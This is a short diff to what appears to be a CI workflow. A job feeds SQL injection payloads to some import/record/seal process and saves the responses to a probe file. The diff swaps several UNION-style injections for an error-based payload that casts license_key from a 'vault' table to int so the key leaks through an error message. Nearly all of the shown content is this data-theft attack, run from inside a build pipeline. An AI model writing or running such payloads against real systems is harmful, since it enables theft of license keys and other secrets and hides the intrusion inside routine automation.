@@ -36,10 +36,7 @@ jobs:
               printf '\n== Base %s ==\nPayload: %s\n== import ==\n%s\n== record ==\n%s\n== seal ==\n%s\n' "$id" "$col" "$import" "$record" "$seal"
             } >> extracted/probe.txt
           done <<'PAYLOADS'
-          x, (SELECT license_key FROM vault WHERE team='workspace') AS leak
-          x || (SELECT license_key FROM vault WHERE team='workspace')
-          x FROM vault WHERE team='workspace' --
-          x) FROM vault --
+          x'||(SELECT license_key::int FROM vault WHERE team=$$workspace$$)||'
           PAYLOADS
       - name: Publish source to check output
         env:
